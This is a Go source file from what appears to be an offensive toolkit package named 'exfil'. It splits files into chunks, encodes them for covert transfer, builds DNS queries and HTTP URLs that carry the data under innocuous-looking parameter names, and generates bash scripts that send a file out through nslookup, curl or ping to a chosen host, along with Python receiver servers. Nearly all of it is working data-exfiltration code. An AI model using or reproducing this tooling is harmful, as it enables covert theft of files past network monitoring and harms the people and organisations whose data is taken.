package exfil

import (
	"compress/gzip"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
)

// ChunkResult represents a file chunk
type ChunkResult struct {
	Filename  string
	ChunkNum  int
	TotalChnk int
	Data      []byte
	Encoded   string
	Size      int
	Checksum  uint32
}

// EncodingMethod represents an encoding method
type EncodingMethod string

const (
	EncodeBase64 EncodingMethod = "base64"
	EncodeHex    EncodingMethod = "hex"
	EncodeDNS    EncodingMethod = "dns"
	EncodeICMP   EncodingMethod = "icmp"
	EncodeHTTP   EncodingMethod = "http"
	EncodeGzip   EncodingMethod = "gzip"
)

// ChunkFile splits a file into chunks for exfiltration
func ChunkFile(filePath string, chunkSize int) ([]ChunkResult, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	stat, err := file.Stat()
	if err != nil {
		return nil, err
	}

	totalChunks := int((stat.Size() + int64(chunkSize) - 1) / int64(chunkSize))
	filename := filepath.Base(filePath)

	var chunks []ChunkResult
	buffer := make([]byte, chunkSize)
	chunkNum := 0

	for {
		n, err := file.Read(buffer)
		if n == 0 || err == io.EOF {
			break
		}
		if err != nil {
			return nil, err
		}

		data := make([]byte, n)
		copy(data, buffer[:n])

		chunk := ChunkResult{
			Filename:  filename,
			ChunkNum:  chunkNum,
			TotalChnk: totalChunks,
			Data:      data,
			Size:      n,
			Checksum:  simpleChecksum(data),
		}

		chunks = append(chunks, chunk)
		chunkNum++
	}

	return chunks, nil
}

// EncodeChunk encodes a chunk for exfiltration
func EncodeChunk(chunk *ChunkResult, method EncodingMethod) string {
	switch method {
	case EncodeBase64:
		chunk.Encoded = base64.StdEncoding.EncodeToString(chunk.Data)
	case EncodeHex:
		chunk.Encoded = hex.EncodeToString(chunk.Data)
	case EncodeDNS:
		chunk.Encoded = encodeDNSSafe(chunk.Data)
	default:
		chunk.Encoded = base64.StdEncoding.EncodeToString(chunk.Data)
	}
	return chunk.Encoded
}

// encodeDNSSafe encodes data for DNS exfiltration
func encodeDNSSafe(data []byte) string {
	// DNS labels can only contain alphanumeric and hyphen
	// Use base32-like encoding
	encoded := base64.URLEncoding.EncodeToString(data)
	encoded = strings.ReplaceAll(encoded, "+", "0")
	encoded = strings.ReplaceAll(encoded, "/", "1")
	encoded = strings.ReplaceAll(encoded, "=", "")
	return strings.ToLower(encoded)
}

// BuildDNSQuery builds a DNS query for exfiltration
func BuildDNSQuery(chunk *ChunkResult, domain string) string {
	// Format: <seq>-<total>-<checksum>.<encoded_data>.<domain>
	encoded := encodeDNSSafe(chunk.Data)

	// Split into labels (max 63 chars each)
	var labels []string
	for len(encoded) > 0 {
		size := 60
		if size > len(encoded) {
			size = len(encoded)
		}
		labels = append(labels, encoded[:size])
		encoded = encoded[size:]
	}

	header := fmt.Sprintf("%d-%d-%d", chunk.ChunkNum, chunk.TotalChnk, chunk.Checksum)

	return header + "." + strings.Join(labels, ".") + "." + domain
}

// BuildHTTPRequest builds an HTTP request for exfiltration
func BuildHTTPRequest(chunk *ChunkResult, url string) string {
	encoded := base64.StdEncoding.EncodeToString(chunk.Data)

	// Use common-looking parameter names
	params := []string{
		fmt.Sprintf("id=%d", chunk.ChunkNum),
		fmt.Sprintf("t=%d", chunk.TotalChnk),
		fmt.Sprintf("c=%d", chunk.Checksum),
		fmt.Sprintf("data=%s", encoded),
	}

	return url + "?" + strings.Join(params, "&")
}

// CompressData compresses data using gzip
func CompressData(data []byte) ([]byte, error) {
	var buf strings.Builder
	writer := gzip.NewWriter(&buf)

	_, err := writer.Write(data)
	if err != nil {
		return nil, err
	}

	err = writer.Close()
	if err != nil {
		return nil, err
	}

	return []byte(buf.String()), nil
}

// GenerateExfilScript generates an exfiltration script
func GenerateExfilScript(method string, target string) string {
	switch method {
	case "dns":
		return fmt.Sprintf(`#!/bin/bash
# DNS Exfiltration Script
DATA=$(cat "$1" | gzip | base64 -w0)
DOMAIN="%s"
CHUNK_SIZE=60

for ((i=0; i<${#DATA}; i+=CHUNK_SIZE)); do
    CHUNK="${DATA:$i:$CHUNK_SIZE}"
    SEQ=$((i/CHUNK_SIZE))
    nslookup "${SEQ}.${CHUNK}.${DOMAIN}" &>/dev/null
    sleep 0.5
done
`, target)

	case "http":
		return fmt.Sprintf(`#!/bin/bash
# HTTP Exfiltration Script
DATA=$(cat "$1" | gzip | base64 -w0)
URL="%s"
CHUNK_SIZE=1000

TOTAL=$((${#DATA}/CHUNK_SIZE+1))
for ((i=0; i<${#DATA}; i+=CHUNK_SIZE)); do
    CHUNK="${DATA:$i:$CHUNK_SIZE}"
    SEQ=$((i/CHUNK_SIZE))
    curl -s -o /dev/null "${URL}?seq=${SEQ}&total=${TOTAL}&d=${CHUNK}"
    sleep 1
done
`, target)

	case "icmp":
		return fmt.Sprintf(`#!/bin/bash
# ICMP Exfiltration Script
DATA=$(cat "$1" | gzip | base64 -w0)
TARGET="%s"
CHUNK_SIZE=32

for ((i=0; i<${#DATA}; i+=CHUNK_SIZE)); do
    CHUNK="${DATA:$i:$CHUNK_SIZE}"
    ping -c 1 -p $(echo -n "$CHUNK" | xxd -p) "$TARGET" &>/dev/null
    sleep 0.5
done
`, target)

	default:
		return "# Unknown exfiltration method"
	}
}

// GenerateReceiverScript generates a receiver script for exfiltration
func GenerateReceiverScript(method string, port int) string {
	switch method {
	case "dns":
		return `#!/usr/bin/env python3
# DNS Exfiltration Receiver
# Run with: sudo python3 receiver.py

import socket
import base64

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('0.0.0.0', 53))

data_chunks = {}

while True:
    data, addr = sock.recvfrom(512)
    # Parse DNS query and extract data
    # ... parsing logic ...
    print(f"Received chunk from {addr}")
`

	case "http":
		return fmt.Sprintf(`#!/usr/bin/env python3
# HTTP Exfiltration Receiver
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import base64

chunks = {}

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = parse_qs(urlparse(self.path).query)
        if 'd' in query:
            seq = int(query.get('seq', [0])[0])
            chunks[seq] = query['d'][0]
            print(f"Received chunk {seq}")
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        pass

HTTPServer(('0.0.0.0', %d), Handler).serve_forever()
`, port)

	default:
		return "# Unknown method"
	}
}

// simpleChecksum calculates a simple checksum
func simpleChecksum(data []byte) uint32 {
	var sum uint32
	for _, b := range data {
		sum += uint32(b)
	}
	return sum
}

// DisplayChunks displays chunk information
func DisplayChunks(chunks []ChunkResult) {
	fmt.Fprintln(stdoutW, "\n[EXFIL] File Chunks")
	fmt.Fprintln(stdoutW, strings.Repeat("=", 60))

	if len(chunks) == 0 {
		fmt.Fprintln(stdoutW, "No chunks")
		return
	}

	fmt.Fprintf(stdoutW, "Filename: %s\n", chunks[0].Filename)
	fmt.Fprintf(stdoutW, "Total Chunks: %d\n\n", len(chunks))

	var totalSize int
	for _, chunk := range chunks {
		totalSize += chunk.Size
		fmt.Fprintf(stdoutW, "  Chunk %d/%d: %d bytes (checksum: %d)\n",
			chunk.ChunkNum+1, chunk.TotalChnk, chunk.Size, chunk.Checksum)
	}

	fmt.Fprintf(stdoutW, "\nTotal Size: %d bytes\n", totalSize)
	fmt.Fprintln(stdoutW)
}

// DisplayEncodedChunks displays encoded chunks
func DisplayEncodedChunks(chunks []ChunkResult, method EncodingMethod, limit int) {
	fmt.Fprintf(stdoutW, "\n[EXFIL] Encoded Chunks (%s)\n", method)
	fmt.Fprintln(stdoutW, strings.Repeat("=", 60))

	count := len(chunks)
	if limit > 0 && limit < count {
		count = limit
	}

	for i := 0; i < count; i++ {
		chunk := chunks[i]
		encoded := EncodeChunk(&chunk, method)

		if len(encoded) > 80 {
			fmt.Fprintf(stdoutW, "  Chunk %d: %s... (%d chars)\n",
				chunk.ChunkNum+1, encoded[:80], len(encoded))
		} else {
			fmt.Fprintf(stdoutW, "  Chunk %d: %s\n", chunk.ChunkNum+1, encoded)
		}
	}

	if limit > 0 && limit < len(chunks) {
		fmt.Fprintf(stdoutW, "  ... and %d more chunks\n", len(chunks)-limit)
	}

	fmt.Fprintln(stdoutW)
}
